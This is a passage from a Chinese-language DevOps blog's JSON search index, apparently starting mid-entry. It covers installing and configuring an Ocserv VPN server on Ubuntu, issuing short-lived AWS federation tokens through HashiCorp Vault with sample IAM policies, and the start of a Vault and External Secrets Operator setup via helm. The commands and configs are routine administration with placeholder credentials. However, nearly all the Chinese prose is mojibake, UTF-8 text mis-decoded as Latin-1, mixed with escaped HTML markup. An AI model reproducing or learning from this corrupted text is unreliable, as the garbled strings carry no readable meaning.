æ³•å®‰è£…ï¼Œè€Œå‘˜å·¥åˆéœ€è¦æ‰‹æœºæˆ–PCç™»å½•VPNè®¿é—®äº‘ä¸Šçš„èµ„æºï¼Œæ²¡åŠæ³•ï¼Œæ‰¾äº†åˆæ‰¾ï¼Œç»ˆäºï¼Œå‘ç°ciscoçš„vpnè¿˜æ˜¯èƒ½åœ¨è‹¹æœå¸‚åœºä¸‹è½½å®‰è£…çš„ï¼Œé‚£å°±è£…ä¸ªå¼€æºçš„Ocservå§ï¼Œåˆ«è¯´è¿˜æŒºå¥½ï¼Œèƒ½åˆ†ç»„æ§åˆ¶è·¯ç”±çš„å‘å¸ƒï¼Œéå¸¸ä¸é”™\u003c/p\u003e\n\u003cp\u003eè®°å½•ä¸€ä¸‹å®‰è£…é…ç½®è¿‡ç¨‹ï¼Œä½¿ç”¨Ubuntu 24.04çš„åº•ç‰ˆï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt upgrade\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-cache show ocserv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get install -y ocserv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eocserv --version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…æ­¥éª¤å°±å¦‚ä¸Šï¼Œéå¸¸ç®€å•ï¼Œè·Ÿopenvpnä¸€æ ·ï¼Œé…ç½®æ–‡ä»¶å°±ä¸€ä¸ª \u003ccode\u003e/etc/ocserv/ocserv.conf\u003c/code\u003e, ç¼–è¾‘ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è®¤è¯æ–¹å¼ä¸ºç”¨æˆ·åå¯†ç è®¤è¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eauth\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;plain[passwd=/etc/ocserv/passwd]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¼€æ”¾ç«¯å£\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcp-port \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e443\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eudp-port \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e443\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è¯ä¹¦\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver-cert \u003cspan class=\"o\"\u003e=\u003c/span\u003e /etc/ocserv/_.rendoumi.com.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver-key \u003cspan class=\"o\"\u003e=\u003c/span\u003e /etc/ocserv/_.rendoumi.com.key\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æœ€å¤šç”¨æˆ·æ•°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emax-clients \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç»‘å®šåŸŸå\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefault-domain \u003cspan class=\"o\"\u003e=\u003c/span\u003e m.rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# åˆ†é…çš„åŠ¨æ€ipæ®µ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipv4-network \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.8.12.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipv4-netmask \u003cspan class=\"o\"\u003e=\u003c/span\u003e 255.255.255.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä¸è·¯ç”±\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-route \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.0.0.0/255.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-route \u003cspan class=\"o\"\u003e=\u003c/span\u003e 172.16.0.0/255.240.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-route \u003cspan class=\"o\"\u003e=\u003c/span\u003e 192.168.0.0/255.255.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å‘å¸ƒè·¯ç”±\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eroute\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.8.2.15/32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eroute\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.10.247.234/32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eroute\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.10.240.37/32\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯´æ˜ï¼šç«¯å£å¼€åœ¨äº†443ç«¯å£ï¼Œè¯ä¹¦ç”¨çš„æ˜¯acmeçš„å…è´¹è¯ä¹¦ï¼ŒåŸŸåæ˜¯m.rendoumi.comï¼Œipæ®µæ˜¯10.8.12.0/24\u003c/p\u003e","title":"Ocserv VPNçš„å®‰è£…å’Œä½¿ç”¨"},{"content":"Vaultçš„ä½¿ç”¨ç»§ç»­æ·±å…¥ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½æ˜¯å…ˆæ‹¿åˆ°valutçš„root tokenï¼Œç„¶åç™»å½•è®¾ç½®awsçš„è®¤è¯ï¼ŒåŒæ—¶æŠŠawsçš„iam rootå‡­æ®çŒè¿›å»ï¼Œç„¶åwriteè¿›è¡Œè®ºè½¬ï¼Œè¿™æ ·å‡­æ®å°±åªå­˜åœ¨äºvaultä¹‹ä¸­äº†ï¼Œæ²¡æœ‰æ³„éœ²çš„å¯èƒ½ã€‚ç„¶åä»è¿™ä¸ªrootå‡­æ®å†æ´¾ç”Ÿæˆå„ç§ä½¿ç”¨æ—¶é•¿æœ‰é™åˆ¶çš„ä¸´æ—¶å‡­æ®ç”¨ã€‚\nä½†æ˜¯ï¼Œå˜¿å˜¿ï¼Œæˆ‘ååæ²¡æœ‰rootå‡­æ®ï¼Œå› ä¸ºæˆ‘æ˜¯å¤–é¢ç®¡ç†å‘˜ã€‚åªèƒ½ç”¨ federation_token è¿›è¡Œç™»å½•ã€‚\né‚£æ€ä¹ˆä½¿ç”¨å‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼š\né¦–å…ˆåœ¨AWSçš„IAMå»ºç«‹ä¸¤ä¸ªpolicy\n# Federator çš„policyï¼Œç”¨äºè·å¾—token { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;VisualEditor0\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;sts:GetFederationToken\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } # Change-self-access-keys çš„policyï¼Œç”¨äºè½®è½¬key { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;iam:ListUsers\u0026#34;, \u0026#34;iam:GetAccountPasswordPolicy\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;iam:*AccessKey*\u0026#34;, \u0026#34;iam:GetUser\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:iam::*:user/${aws:username}\u0026#34; ] } ] } ç„¶ååœ¨Vaultä¸­è®¾ç½®ä½¿ç”¨AWS secrets\nvault secrets enable aws # awsä¸­éœ€è¦å¯¹åº”IAMçš„æƒé™ # è¦ä¹ˆæ˜¯çœŸæœ‰aws iamçš„ç”¨æˆ·ï¼›è¦ä¹ˆæ˜¯æœ‰ä¸€ä¸ªroleï¼Œå’Œå¯¹åº”çš„ä¸´æ—¶ç”¨æˆ·ï¼›äºŒé€‰ä¸€ vault write aws/config/root access_key=YYY \\ secret_key=XXX region=us-east-1 \\ sts_endpoint=https://sts.us-east-1.amazonaws.com sts_region=us-east-1 # è½®è½¬rootå‡­æ®ï¼Œè¿™æ ·rootå‡­æ®å°±åªå­˜åœ¨äºvaultä¸­äº† vault write -force aws/config/rotate-root ä½¿ç”¨æ–¹æ³•ï¼š\n# é¦–å…ˆvaultå…ˆå»ºä¸€ä¸ªè§’è‰²ï¼Œè¿™é‡Œçš„è§’è‰²æ˜¯ec2-adminï¼š vault write aws/roles/$role - \u0026lt; aws/roles/$role.json å†…å®¹å¦‚ä¸‹ï¼š { \u0026#34;credential_type\u0026#34;: \u0026#34;federation_token\u0026#34;, \u0026#34;default_sts_ttl\u0026#34;: 300, \u0026#34;iam_groups\u0026#34;: null, \u0026#34;max_sts_ttl\u0026#34;: 3600, \u0026#34;policy_arns\u0026#34;: [ \u0026#34;arn:aws:iam::aws:policy/AmazonEC2FullAccess\u0026#34; ], \u0026#34;policy_document\u0026#34;: \u0026#34;\u0026#34; } # æ‹¿åˆ°AK vault write aws/sts/ec2-admin ttl=15m Key Value --- ----- lease_id aws/sts/ec2-admin/NNN lease_duration 14m59s lease_renewable false access_key XXX secret_key YYY security_token ZZZ ttl 14m59s æ­£å¸¸ä½¿ç”¨AWSçš„å‡­æ®çš„æ–‡ç« ï¼š\nhttps://devopstronaut.com/hashicorp-vault-101-10-step-by-step-guide-to-configuring-dynamic-aws-credentials-using-iam-user-edb5a75f868a https://notes.kodekloud.com/docs/HashiCorp-Certified-Vault-Associate-Certification/Compare-and-Configure-Secrets-Engines/Demo-AWS-Secrets-Engine-IAM ","permalink":"https://rendoumi.com/posts/20250818-vault_sts_token/","summary":"\u003cp\u003eVaultçš„ä½¿ç”¨ç»§ç»­æ·±å…¥ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½æ˜¯å…ˆæ‹¿åˆ°valutçš„root tokenï¼Œç„¶åç™»å½•è®¾ç½®awsçš„è®¤è¯ï¼ŒåŒæ—¶æŠŠawsçš„iam rootå‡­æ®çŒè¿›å»ï¼Œç„¶åwriteè¿›è¡Œè®ºè½¬ï¼Œè¿™æ ·å‡­æ®å°±åªå­˜åœ¨äºvaultä¹‹ä¸­äº†ï¼Œæ²¡æœ‰æ³„éœ²çš„å¯èƒ½ã€‚ç„¶åä»è¿™ä¸ªrootå‡­æ®å†æ´¾ç”Ÿæˆå„ç§ä½¿ç”¨æ—¶é•¿æœ‰é™åˆ¶çš„ä¸´æ—¶å‡­æ®ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œå˜¿å˜¿ï¼Œæˆ‘ååæ²¡æœ‰rootå‡­æ®ï¼Œå› ä¸ºæˆ‘æ˜¯å¤–é¢ç®¡ç†å‘˜ã€‚åªèƒ½ç”¨ federation_token è¿›è¡Œç™»å½•ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æ€ä¹ˆä½¿ç”¨å‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆåœ¨AWSçš„IAMå»ºç«‹ä¸¤ä¸ªpolicy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Federator çš„policyï¼Œç”¨äºè·å¾—token\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Sid\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;VisualEditor0\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;sts:GetFederationToken\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Change-self-access-keys çš„policyï¼Œç”¨äºè½®è½¬key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:ListUsers\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:GetAccountPasswordPolicy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:*AccessKey*\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:GetUser\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:iam::*:user/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eaws\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶ååœ¨Vaultä¸­è®¾ç½®ä½¿ç”¨AWS secrets\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evault secrets \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e aws\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# awsä¸­éœ€è¦å¯¹åº”IAMçš„æƒé™\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è¦ä¹ˆæ˜¯çœŸæœ‰aws iamçš„ç”¨æˆ·ï¼›è¦ä¹ˆæ˜¯æœ‰ä¸€ä¸ªroleï¼Œå’Œå¯¹åº”çš„ä¸´æ—¶ç”¨æˆ·ï¼›äºŒé€‰ä¸€\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evault write aws/config/root \u003cspan class=\"nv\"\u003eaccess_key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eYYY \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003esecret_key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eXXX \u003cspan class=\"nv\"\u003eregion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eus-east-1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"nv\"\u003ests_endpoint\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttps://sts.us-east-1.amazonaws.com \u003cspan class=\"nv\"\u003ests_region\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eus-east-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è½®è½¬rootå‡­æ®ï¼Œè¿™æ ·rootå‡­æ®å°±åªå­˜åœ¨äºvaultä¸­äº†\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evault write -force aws/config/rotate-root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½¿ç”¨æ–¹æ³•ï¼š\u003c/p\u003e","title":"Vaultä½¿ç”¨AWSçš„federation_tokenè¿›è¡Œäº¤äº’"},{"content":"ä»Šå¤©æ˜¯2025å¹´8æœˆ15æ—¥ï¼Œå¤§å™©è€—å•Šï¼š external-secrets / external-secrets Link\nâ­ 5416 | ğŸ”€ 1032 | Go 97.6%\nExternal Secrets Operator é¡¹ç›®æš‚åœå‘å¸ƒ ç”±äºç»´æŠ¤å›¢é˜Ÿè§„æ¨¡è¿‡å°ï¼ŒExternal Secrets Operator å†³å®šæš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼Œç›´åˆ°é‡å»ºè¶³å¤Ÿçš„ç»´æŠ¤å›¢é˜Ÿã€‚\nKey Takeaways é¡¹ç›®æš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼ŒåŒ…æ‹¬æ–°åŠŸèƒ½ã€è¡¥ä¸å’Œå®¹å™¨é•œåƒã€‚ å°†ç»§ç»­å®¡æ ¸å’Œåˆå¹¶ç¤¾åŒºçš„ PRï¼Œä½†ä¸ä¼šæä¾› GitHub Discussionsã€Slack æˆ–é—®é¢˜è¯„è®ºçš„æ”¯æŒã€‚ éœ€è¦è‡³å°‘äº”åé•¿æœŸç»´æŠ¤è€…æ¥ç¡®ä¿é¡¹ç›®çš„å¯æŒç»­å‘å±•ã€‚ é¼“åŠ±ä¾èµ–è¯¥é¡¹ç›®çš„å…¬å¸æˆ–å›¢é˜Ÿç§¯æå‚ä¸è´¡çŒ®ã€‚ è´¡çŒ®è€…å¯é€šè¿‡å¡«å†™è¡¨å•æˆ–æŸ¥çœ‹æ²»ç†æ–‡æ¡£åŠ å…¥é¡¹ç›®ã€‚ å±…ç„¶æš‚åœå‘å¸ƒäº†ï¼Œé‚£å°±æŠ“ç´§æ—¶é—´æŠŠVaultè·Ÿå®ƒçš„é›†æˆè®°å½•ä¸‹æ¥ï¼š\nä¸€ã€é¦–å…ˆå¿…é¡»åœ¨é›†ç¾¤é‡Œå®‰è£…Vaultï¼Œç„¶åå®‰è£…external -secretsï¼Œéƒ½ç”¨helmè£…å³å¯ helm repo add hashicorp https://helm.releases.hashicorp.com helm repo update helm install vault hashicorp/vault --set \u0026#34;server.dev.enabled=true\u0026#34; --set \u0026#34;injector.enabled=true\u0026#34; --namespace default helm repo add external-secrets https://charts.external-secrets.io helm repo update helm install external-secrets external-secrets/external-secrets --namespace external-secrets --create-namespace --set installCRDs=true äºŒã€k8sæˆæƒï¼Œk8çš„æˆæƒä½“ç³»å°±æ˜¯ sa -\u0026gt; role 